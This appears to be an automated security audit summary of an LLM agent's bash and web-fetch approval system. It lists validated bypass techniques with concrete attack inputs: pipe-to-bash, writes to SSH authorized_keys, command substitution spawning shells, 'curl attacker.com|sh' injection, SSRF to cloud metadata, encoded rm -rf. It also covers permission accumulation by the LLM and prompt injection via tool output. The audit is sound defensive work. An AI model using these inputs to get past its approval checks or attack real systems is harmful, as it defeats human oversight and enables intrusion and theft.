# Deep Probe Summary: Team-02 (Agent Tool Execution + Approval System)
# Components: DFD-3 (LLM Output -> Agent Tool -> bash -c), CFD-2 (Agent Approval)

Status: complete
Loops: 1
Total hypotheses: 26 (PH-01 through PH-23, plus 3 CROSS seeds producing distinct attack paths)
Validated: 18
Needs-Deeper: 5
Invalidated: 3
Stop reason: All entry points covered; no Fragile items; Q4 gaps are externally-dependent

---

## Validated Hypotheses

### PH-01 / CROSS-01: Pipe Target Bypass — Arbitrary File Write / Code Execution
- Reasoning-Model: Pre-Mortem + Causal
- Target: `x/agent/approval.go:206` — `extractBashPrefix`; `x/agent/approval.go:218-222` — safeCommands
- Attack input: After any `cat:tools/` prefix approval — `cat tools/run.go | tee ~/.ssh/authorized_keys` or `cat tools/a.go | base64 -d | bash`
- Code path: `run.go:373` IsDenied=false (tee/bash not in denyPatterns) → `run.go:404` IsAllowed=true (`cat:tools/` prefix matches via line 449) → `run.go:436` BashTool.Execute → `bash -c "cat tools/run.go | tee ..."` → bash executes full pipeline
- Sanitizers on path: `extractBashPrefix` — bypassable: `strings.Split(command, "|")` at line 206 discards all pipe segments after first; `IsDenied` — bypassable: `tee`, `base64`, `bash`, `sh`, `python3`, `perl` absent from denyPatterns
- Security consequence: Arbitrary file write to any path writable by the process; pipe to `bash`/`sh` = arbitrary code execution; pipe to `tee ~/.ssh/authorized_keys` = persistent SSH backdoor
- Severity estimate: CRITICAL
- Evidence file: round-1-evidence.md

### PH-09 / CROSS-06: SSH authorized_keys Write — Zero-Layer Defense Gap
- Reasoning-Model: Pre-Mortem + Causal
- Target: `x/agent/approval.go:113-114` — denyPathPatterns (authorized_keys absent); `x/agent/approval.go:206` — pipe split
- Attack input: `cat tools/pubkey.go | tee ~/.ssh/authorized_keys`
- Code path: IsDenied scan of all patterns — `.ssh/authorized_keys` matches NONE of the 5 listed SSH patterns (id_rsa, id_dsa, id_ecdsa, id_ed25519, config); extractBashPrefix ignores pipe tail; IsAllowed returns true; bash executes tee write
- Sanitizers on path: `denyPathPatterns` — bypassable: explicit gap, only key files listed not `authorized_keys`; `isCommandOutsideCwd` — bypassable: detects the issue (line 312) but result is advisory-only and never shown when IsAllowed=true
- Security consequence: Attacker-controlled SSH public key injected into `~/.ssh/authorized_keys` → persistent SSH access with attacker's private key
- Severity estimate: CRITICAL
- Evidence file: round-1-evidence.md

### PH-04 / CROSS-03: Command Substitution in Path Arg — Shell Expansion Bypass
- Reasoning-Model: Abductive + Causal
- Target: `x/agent/approval.go:253` — `path.Clean(arg)`; `x/agent/approval.go:449-451` — `matchesHierarchicalPrefix`
- Attack input: `cat tools/$(id > /tmp/out)/a.go` or `cat tools/$(python3 -c "import os,pty;pty.spawn('/bin/sh')")/x`
- Code path: `strings.Fields` splits command → arg `"tools/$(id)/a.go"` → path.Clean returns `"tools/$(id)/a.go"` (lexical only) → `path.Dir` = `"tools/$(id)"` → returns prefix `"cat:tools/$(id)/"` → `matchesHierarchicalPrefix`: `strings.HasPrefix("tools/$(id)/", "tools/")` = TRUE → IsAllowed=true → bash executes: command substitution runs during bash path expansion
- Sanitizers on path: `path.Clean` — bypassable: documented as lexical-only, cannot evaluate shell expansion syntax; `strings.Fields` — bypassable: not shell-aware, no quoting or expansion handling
- Security consequence: Arbitrary code execution disguised as a file-read command; executes any shell command accessible to the agent user
- Severity estimate: CRITICAL
- Evidence file: round-1-evidence.md

### PH-02 / CROSS-04: sed -i File Modification — Write Escalation via safeCommands
- Reasoning-Model: Pre-Mortem + Causal
- Target: `x/agent/approval.go:222` — `"sed": true` in safeCommands; `x/agent/approval.go:232-234` — flag skipping
- Attack input: Seed: `sed 's/x/y/' tools/a.go` → Exploit: `sed -i 's/exit 0/curl attacker.com|sh/' tools/deploy.sh`
- Code path: extractBashPrefix on exploit command: `baseCmd="sed"` → safeCommand; `-i` flag skipped (line 233); `tools/deploy.sh` → returns `"sed:tools/"` → matchesHierarchicalPrefix true → IsAllowed=true → bash executes sed -i in-place modification
- Sanitizers on path: `safeCommands` — bypassable: `sed -i` has destructive write capability incompatible with read-only intent; no flag analysis performed
- Security consequence: In-place modification of source files, deploy scripts, Makefiles, or configuration; persistent backdoor injection into executable files
- Severity estimate: HIGH
- Evidence file: round-1-evidence.md

### PH-03: find -exec Arbitrary Command Execution
- Reasoning-Model: Pre-Mortem + Causal
- Target: `x/agent/approval.go:221` — `"find": true` in safeCommands
- Attack input: Seed: `find tools/ -name "*.go"` → Exploit: `find tools/ -name "*.sh" -exec bash {} \;`
- Code path: extractBashPrefix: `baseCmd="find"` → safeCommand; `tools/` → `"find:tools/"` → auto-approved; bash: `find -exec bash` executes every shell script in tools/ as a bash script
- Sanitizers on path: `safeCommands` — bypassable: `find -exec` can execute arbitrary commands; IsDenied — bypassable: `bash` standalone not in denyPatterns; only `rm -rf` within -exec is blocked
- Security consequence: Arbitrary code execution via `-exec bash`; exfiltration via `-exec curl`; file enumeration combined with processing
- Severity estimate: HIGH
- Evidence file: round-1-evidence.md

### PH-06 / CROSS-02: Semicolon Injection — Commands Beyond Pipe Scope
- Reasoning-Model: Pre-Mortem + Causal
- Target: `x/agent/approval.go:206` — `strings.Split(command, "|")` only; `;` not handled
- Attack input: `cat tools/a.go; curl http://attacker.com/$(cat /tmp/data | base64)`
- Code path: extractBashPrefix: `strings.Split` on `|` → single part (no pipe); `strings.Fields` treats `"tools/a.go;"` as one token (semicolon is part of the filename in Go's view but bash interprets it as separator); first path arg found → `"cat:tools/"` → auto-approved; bash splits on `;` and executes both commands
- Sanitizers on path: extractBashPrefix — bypassable: `;`-split not performed; `isCommandOutsideCwd` — splits on `;` correctly but is advisory-only
- Security consequence: Arbitrary second command executes after benign first; exfiltration, network calls, file manipulation
- Severity estimate: HIGH
- Evidence file: round-1-evidence.md

### PH-07: Non-bash Tool Blanket Approval — SSRF and Scope Bypass
- Reasoning-Model: Pre-Mortem + Causal
- Target: `x/agent/approval.go:477` — `a.allowlist[toolName] = true` for non-bash; `x/agent/approval.go:418-420`
- Attack input: Session approves `web_fetch("https://example.com")` → LLM issues `web_fetch("http://169.254.169.254/latest/meta-data/")`
- Code path: AddToAllowlist for first call → `a.allowlist["web_fetch"] = true`; subsequent call → `IsAllowed` → `a.allowlist["web_fetch"]` = true → auto-approved → WebFetchTool.Execute with any URL; `url.Parse` at webfetch.go:85 accepts all schemes
- Sanitizers on path: `url.Parse` — bypassable: scheme/host not filtered; allowlist — bypassable: per-tool not per-argument
- Security consequence: LLM-directed SSRF to any URL including cloud metadata endpoints, internal services; Ollama signing key attached to all requests
- Severity estimate: HIGH
- Evidence file: round-1-evidence.md

### PH-08: YoloMode — Complete Approval Bypass
- Reasoning-Model: Abductive + Causal
- Target: `x/cmd/run.go:159` — `YoloMode bool`; `x/cmd/run.go:400`
- Attack input: Any session with YoloMode=true flag
- Code path: `run.go:400`: `if opts.YoloMode { fmt.Fprintf(...); }` — falls through to execution without any approval check; NOTE: IsDenied check at line 373 still runs before YoloMode block
- Sanitizers on path: IsDenied — still active in YoloMode; approval system — fully disabled
- Security consequence: Any LLM-directed command not matching denyPatterns executes unconditionally; no user visibility; effectively unrestricted code execution
- Severity estimate: HIGH (by design, but represents total security boundary removal)
- Evidence file: round-1-evidence.md

### PH-10: Brace Expansion — Shell Expansion Invisible to path.Clean
- Reasoning-Model: Abductive + Causal
- Target: `x/agent/approval.go:253` — `path.Clean(arg)`; `x/agent/approval.go:262-268` — sibling check
- Attack input: `cat tools/{safe.go,../../etc/passwd}` (requires `cat:tools/` in allowlist)
- Code path: arg = `"tools/{safe.go,../../etc/passwd}"` → contains `..` → sibling check triggered: `origBase="tools"`, `path.Clean(arg)="tools/{safe.go,../../etc/passwd}"`, `cleanedBase="tools"` → same base → NO escape detected → returns `"cat:tools/"` → auto-approved; bash expands braces → reads both `tools/safe.go` AND `../../etc/passwd`
- Sanitizers on path: sibling check — bypassable: `path.Clean` cannot evaluate brace content; `..` inside braces appears as `origBase==cleanedBase` → passes sibling check
- Security consequence: Reads/processes arbitrary filesystem paths alongside the expected directory; information disclosure
- Severity estimate: HIGH
- Evidence file: round-1-evidence.md

### PH-11: IsDenied Normalization Bypass — Double-Space / Encoding
- Reasoning-Model: TRIZ + Causal
- Target: `x/agent/approval.go:180` — `strings.Contains(commandLower, pattern)` raw substring match
- Attack input: `rm  -rf /tmp/important` (double space); `echo cm0gLXJmIC8K | base64 -d | bash` (base64-encoded `rm -rf /`)
- Code path: `commandLower = "rm  -rf ..."` → `strings.Contains("rm  -rf", "rm -rf")` = FALSE; double-space bypasses all single-space deny patterns
- Sanitizers on path: IsDenied — bypassable: no whitespace normalization; no decoding of encoded payloads
- Security consequence: Bypasses all IsDenied protections via simple whitespace manipulation; enables rm -rf, sudo, chmod attacks
- Severity estimate: HIGH
- Evidence file: round-1-evidence.md

### PH-17 / CROSS-02: grep Multi-Path Argument Scope Escape
- Reasoning-Model: TRIZ + Causal
- Target: `x/agent/approval.go:284` — immediate return after first path arg found
- Attack input: After `grep:api/` stored — `grep -r "" api/ /home/user/secrets/`
- Code path: extractBashPrefix: first path arg `api/` → returns `"grep:api/"` → auto-approved; additional `/home/user/secrets/` argument completely ignored; bash searches both directories
- Sanitizers on path: extractBashPrefix — bypassable: only first path arg evaluated; multi-argument commands not scoped
- Security consequence: Read access to arbitrary filesystem locations when grep is approved for a specific directory
- Severity estimate: HIGH
- Evidence file: round-1-evidence.md

### PH-16: isCommandOutsideCwd Advisory-Only — Warning System Architecturally Disabled
- Reasoning-Model: TRIZ + Causal
- Target: `x/agent/approval.go:503`; `x/cmd/run.go:404`
- Code path: `isCommandOutsideCwd` result sets `isWarning=true` → used only in `RequestApproval` display → `RequestApproval` NOT called when `IsAllowed=true` → warning NEVER shown for auto-approved dangerous commands
- Security consequence: The safety warning layer is structurally bypassed by the auto-approval mechanism; provides a false sense of security
- Severity estimate: MEDIUM
- Evidence file: round-1-evidence.md

### PH-18: $HOME Expansion Bypasses isCommandOutsideCwd Tilde Detection (MEDIUM, advisory)
- Reasoning-Model: TRIZ
- Target: `x/agent/approval.go:364-368` — `~` detection in isCommandOutsideCwd
- Attack input: `echo "ssh-rsa ..." >> $HOME/.ssh/authorized_keys`
- Code path: `isCommandOutsideCwd` checks `strings.HasPrefix(arg, "~")` for `$HOME` but not `${HOME}` or `$HOME` forms; `$HOME` form bypasses tilde detection
- Security consequence: Advisory warning not shown even when the warning system IS active; compound failure with PH-16
- Severity estimate: MEDIUM
- Evidence file: round-1-evidence.md

### PH-19: Prefix Accumulation — LLM Strategic Permission Escalation
- Reasoning-Model: Game-Theory
- Target: `x/agent/approval.go:459-477` — AddToAllowlist; `x/agent/approval.go:425-456` — matchesHierarchicalPrefix
- Attack scenario: Multi-turn session; LLM obtains `cat:tools/`, `grep:api/`, `sed:tools/`, `find:tools/` across legitimate-looking operations; combined scope enables PH-01, PH-02, PH-03, PH-04, PH-06, PH-10, PH-17 simultaneously
- Security consequence: The system has no aggregate scope review; individually reasonable approvals compound into near-unrestricted filesystem access
- Severity estimate: HIGH
- Evidence file: round-1-evidence.md

---

## NEEDS-DEEPER

### PH-12: autoAllowPrefixes — Script Execution Commands in Commented-Out Auto-Allow List
- Why unresolved: Code is currently disabled (run.go:391-394 commented out with TODO). Risk is in the re-enablement path.
- Current state: `autoAllowPrefixes` includes `"make"`, `"npm run"`, `"go build"`, `"go test"`, `"cargo build"` — all capable of executing arbitrary code via Makefile, package.json, test code injection
- Suggested follow-up: Phase 8 should monitor if TODO is re-enabled; if so, the entire `autoAllowPrefixes` list should be audited for code-execution commands before re-enabling

### PH-20: Prompt Injection via Tool Output
- Why unresolved: Model-dependent; requires testing with specific LLM models
- Code path confirmed: tool results are appended verbatim to message history (run.go:476-482) and fed to next LLM call
- Suggested follow-up: Phase 8 should test specific models (claude-sonnet, llama-3, etc.) for susceptibility to role/instruction injection in tool output context

### PH-22: web_fetch file:// and Internal URL SSRF
- Why unresolved: Requires knowledge of ollama.com API filtering behavior; no local code handles this
- Local gap confirmed: `url.Parse` accepts `file://`, `http://169.254.169.254/`; no local scheme/IP filtering in WebFetchTool
- Suggested follow-up: Phase 8 should test ollama.com API response to `file://` and `http://169.254.169.254/` URLs; if proxied, this becomes HIGH severity SSRF

### CROSS-05: autoAllowPrefixes + YoloMode Future Risk
- Why unresolved: Both inputs are individually mitigated currently; risk is in future configuration
- Suggested follow-up: Track the TODO at run.go:391-394; audit interaction between IsAutoAllowed and IsDenied before any re-enablement

### PH-21: DoS via Tool Timeout Accumulation
- Why unresolved: No evidence of loop call limit; low priority
- Suggested follow-up: Low-priority; confirm no global tool-call limit exists in the agent loop

---

## Coverage Summary

| Entry Point | backward-reasoner | contradiction-reasoner | causal-verifier |
|---|:---:|:---:|:---:|
| BashTool.Execute (bash.go:53) | PH-01,02,03,04,05,06,08,09,10 | PH-11,12,16,17,18,19 | CROSS-01,02,03,04 |
| WebFetchTool.Execute (webfetch.go:74) | PH-07 | PH-22 | Confirmed PH-07 |
| WebSearchTool.Execute (websearch.go:80) | PH-07 | NONE | Implied by PH-07 |
| Chat agent loop / tool dispatch (run.go:369) | PH-08 | PH-13,15 | PH-08 confirmed; PH-13,15 invalidated |
| IsAutoAllowed (approval.go:153) | NONE (dead code) | PH-12 | NEEDS-DEEPER |
| IsDenied (approval.go:175) | PH-09 indirectly | PH-11,18 | PH-11 confirmed |
| IsAllowed / extractBashPrefix (approval.go:389,204) | PH-01,02,03,04,06,10 | PH-16,17,19 | All confirmed |
| AddToAllowlist (approval.go:459) | PH-07 | PH-19 | Confirmed |
